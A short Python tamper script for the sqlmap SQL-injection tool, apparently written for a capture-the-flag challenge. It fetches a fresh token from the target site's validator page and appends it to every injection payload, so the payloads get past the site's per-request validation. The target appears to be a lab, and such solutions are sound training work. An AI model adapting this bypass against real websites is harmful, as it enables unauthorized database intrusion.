#!/usr/bin/env python

from lib.core.data import kb
from lib.core.enums import PRIORITY

import requests
import urllib

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    r = requests.get('https://studentportal.elfu.org/validator.php')
    token = 'token=' + r.text
    retVal = payload+'&'+token
    return retVal
